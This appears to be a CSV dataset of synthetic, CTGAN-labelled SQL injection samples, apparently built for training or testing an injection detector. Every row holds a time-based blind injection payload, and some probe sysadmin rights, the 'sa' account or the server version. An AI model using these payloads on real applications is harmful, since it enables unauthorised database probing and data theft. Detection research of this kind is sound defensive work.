id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000947,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,5.433286754271324
CTGAN_000948,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,4.413896773297751
CTGAN_000949,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,7.031804512351615
CTGAN_000950,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,5.237138011767075
CTGAN_000951,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,7.73668026794392
CTGAN_000952,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,7.909284010753932
CTGAN_000953,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,4.817935989710478
CTGAN_000954,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,5.520968519473366
CTGAN_000955,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,6.147146727068487
CTGAN_000956,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,6.655706682094375
CTGAN_000957,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,7.341154288337822
CTGAN_000958,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,4.768081675991254
CTGAN_000959,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,8.058139116772931
CTGAN_000960,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,6.153618460470544
CTGAN_000961,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,6.648313128750993
CTGAN_000962,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,4.786266784027068
CTGAN_000963,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,7.783802027472865
CTGAN_000964,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,7.37380767246267
CTGAN_000965,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,9.33808412781045
CTGAN_000966,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,7.9792737709595345
CTGAN_000967,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,8.486462694266713
CTGAN_000968,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,4.63451014019693
CTGAN_000969,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.563355119749791
CTGAN_000970,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.11413664246946
CTGAN_000971,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,6.935594431899759
CTGAN_000972,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,8.649032975585175
CTGAN_000973,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,5.5948789887283885
CTGAN_000974,attack,time,pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000015,7.635230554839935
CTGAN_000975,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,7.420451490024508
CTGAN_000976,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,6.020560580724554
CTGAN_000977,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,5.10244315592461
CTGAN_000978,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,8.504950665024529
CTGAN_000979,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,5.837914890764326
CTGAN_000980,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,6.91454062625324
CTGAN_000981,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,4.8720614061185605
CTGAN_000982,attack,time,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000013,8.219814855507341
CTGAN_000983,attack,time,"""  )   or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000012,6.057397408992861
CTGAN_000984,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000023,8.259481478265815
CTGAN_000985,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,9.247725620140136
CTGAN_000986,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,7.234872636445483
CTGAN_000987,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,8.358755208902176
CTGAN_000988,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,5.423654461939584
CTGAN_000989,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,8.500018621461791
CTGAN_000990,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,7.1520061295627535
CTGAN_000991,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,6.455877759702936
CTGAN_000992,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,7.026911829484902
CTGAN_000993,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,5.286921756973605
CTGAN_000994,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,5.550915035702931
CTGAN_000995,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,6.321459410057625
CTGAN_000996,attack,time,1 waitfor delay '0:0:10'--,nearest_attack_euclidean,R000021,5.972618928264147
CTGAN_000997,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,5.808568266296173
CTGAN_000998,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,4.948233582366669
CTGAN_000999,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,7.4195117009254306
CTGAN_001000,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.432498125125843
CTGAN_001001,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,6.212629280479146
CTGAN_001002,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,9.118903037373604
CTGAN_001003,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,5.5593114150364125
CTGAN_001004,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,5.403019940903109
CTGAN_001005,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,7.379601111185308
CTGAN_001006,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,8.371459819968294
CTGAN_001007,attack,time,pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000015,6.032843845393406
CTGAN_001008,attack,time,"""   )    )    or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000028,6.4949342285490745
CTGAN_001009,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,4.242142123776764
CTGAN_001010,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,7.703153095403667
CTGAN_001011,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,6.1787433596569326
CTGAN_001012,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,9.484426340230643
CTGAN_001013,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,4.332829536692684
CTGAN_001014,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,8.476643241646999
CTGAN_001015,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,7.329917613189027
CTGAN_001016,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,4.886837139430241
CTGAN_001017,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,7.568629760136184
CTGAN_001018,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,7.618053301314418
CTGAN_001019,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,5.643546131694756
CTGAN_001020,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,6.829324711934751
CTGAN_001021,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,5.2606490316028305
CTGAN_001022,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,6.767377050811393
CTGAN_001023,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,5.399020548189948
CTGAN_001024,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,9.534606591875853
CTGAN_001025,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,4.844157592939521
CTGAN_001026,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,5.920319578031201
CTGAN_001027,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.124813883537911
CTGAN_001028,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,4.663646351699559
CTGAN_001029,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,9.0646053095154
CTGAN_001030,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,6.492461739077177
CTGAN_001031,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,4.594584854924441
CTGAN_001032,attack,time,pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000015,4.851159634823863
CTGAN_001033,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,5.846740532745618
CTGAN_001034,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,6.752391620767277
CTGAN_001035,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,5.591287620254178
CTGAN_001036,attack,time,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000005,7.56470211130057
CTGAN_001037,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,4.7972274824236925
CTGAN_001038,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,7.692285890965229
CTGAN_001039,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,6.649159185711466
CTGAN_001040,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,4.698814534882105
CTGAN_001041,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,6.352274919166792
CTGAN_001042,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,5.8596591140582035
CTGAN_001043,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,6.508732933361727
CTGAN_001044,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,4.790475119501227
CTGAN_001045,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,7.151800963172032
CTGAN_001046,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,6.692832276999381
CTGAN_001047,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,6.901769480942033
CTGAN_001048,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,6.897096706893114
CTGAN_001049,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000023,7.3827496931627845
CTGAN_001050,attack,time,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000005,9.475022788347697
CTGAN_001051,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,8.929649931192182
CTGAN_001052,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,6.763588175520505
CTGAN_001053,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,4.815575122383296
CTGAN_001054,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,6.186136143113277
CTGAN_001055,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,6.317393269745975
CTGAN_001056,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,6.362062642141415
CTGAN_001057,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,6.946075148560137
CTGAN_001058,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000023,8.140063771642152
CTGAN_001059,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,9.47507867568313
CTGAN_001060,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,8.633560584447546
CTGAN_001061,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,7.865519942018358
CTGAN_001062,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,7.341104845190415
CTGAN_001063,attack,time,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000005,8.691030434917216
CTGAN_001064,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,6.116527751507804
CTGAN_001065,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,6.730175721731795
CTGAN_001066,attack,time,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000013,8.196515282831054
CTGAN_001067,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.47749014178715
CTGAN_001068,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,5.980621490412534
CTGAN_001069,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,7.586408220509472
CTGAN_001070,attack,time,"""  )  ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000009,7.571811447123083
CTGAN_001071,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,4.303463795852984
CTGAN_001072,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,4.755696896314995
CTGAN_001073,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,5.669414350029103
CTGAN_001074,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,6.015460314790597
CTGAN_001075,attack,time,1 waitfor delay '0:0:10'--,nearest_attack_euclidean,R000021,8.453976374407324
CTGAN_001076,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,5.132583499685955
CTGAN_001077,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,5.920990059495282
CTGAN_001078,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,6.717615145624136
CTGAN_001079,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,8.162978193474038
CTGAN_001080,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,3.7074158846521614
CTGAN_001081,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,5.3167850993951316
CTGAN_001082,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,7.63371629039572
CTGAN_001083,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,4.1089425271837
CTGAN_001084,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,8.428787961324417
CTGAN_001085,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,5.355988303745999
CTGAN_001086,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.875412164762387
CTGAN_001087,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,6.857672948287374
CTGAN_001088,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,5.836156281577901
CTGAN_001089,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,6.644057898758906
CTGAN_001090,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,5.627758964335225
CTGAN_001091,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,9.523284782562621
CTGAN_001092,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,4.870642506280939
CTGAN_001093,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,8.019724686894909
CTGAN_001094,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,7.261949604413377
CTGAN_001095,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,6.4109659176556
CTGAN_001096,attack,time,"""  )  ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000009,7.014376327247098
CTGAN_001097,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000023,9.143967126120979
CTGAN_001098,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,6.982212686455059
CTGAN_001099,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,5.02553740352097
CTGAN_001100,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,6.208231613062303
CTGAN_001101,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,4.611334065325597
CTGAN_001102,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,5.834198393829981
CTGAN_001103,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,5.603582421808159
CTGAN_001104,attack,time,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000005,8.433211301606924
CTGAN_001105,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,7.5045380512382645
CTGAN_001106,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,5.776441515462719
CTGAN_001107,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,4.391848368344288
CTGAN_001108,attack,time,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000013,7.830871597072734
CTGAN_001109,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,5.427797384531364
CTGAN_001110,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,3.889147262183339
CTGAN_001111,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,7.731941779377633
CTGAN_001112,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,6.383832466825058
CTGAN_001113,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,8.240944044421443
CTGAN_001114,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,4.701290580150601
CTGAN_001115,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,4.7339316857177005
CTGAN_001116,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,6.320046698909965
CTGAN_001117,attack,time,"""  )   or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000012,5.806373664787219
CTGAN_001118,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,6.27159448842344
CTGAN_001119,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,4.23799349969661
CTGAN_001120,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,7.445045231319397
CTGAN_001121,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,6.940112967276608
CTGAN_001122,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,2.902940818233492
CTGAN_001123,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,8.30041658885903
CTGAN_001124,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,8.264610651531513
CTGAN_001125,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,6.453231394338868
CTGAN_001126,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,6.801349769779632
CTGAN_001127,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,4.621600560974847
CTGAN_001128,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,9.151232944006493
CTGAN_001129,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,5.622067891449609
CTGAN_001130,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,8.137496551381112
CTGAN_001131,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,6.147738766880232
CTGAN_001132,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,5.303087210568651
CTGAN_001133,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,6.121391595540228
CTGAN_001134,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,6.4626503858226005
CTGAN_001135,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,6.074858111362863
CTGAN_001136,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,6.64536988063708
CTGAN_001137,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,7.256316547951683
CTGAN_001138,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,5.459988573131881
CTGAN_001139,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,5.2328326820009154
CTGAN_001140,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,6.931054875085509
CTGAN_001141,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,5.982848494350258
CTGAN_001142,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,5.384862895254144
CTGAN_001143,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,7.8142139413746134
CTGAN_001144,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,4.820565706101126
CTGAN_001145,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,5.168518846324154
CTGAN_001146,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,7.299396537285826
CTGAN_001147,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,6.10647235288251
CTGAN_001148,attack,time,pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000015,7.32287438706603
CTGAN_001149,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,5.2952647482318405
CTGAN_001150,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,6.887415212271129
CTGAN_001151,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,5.7293279117118905
CTGAN_001152,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,7.507391791165908
CTGAN_001153,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,6.570328815365509
CTGAN_001154,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,6.675005202668518
CTGAN_001155,attack,time,"""  )  ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000009,7.813057606372919
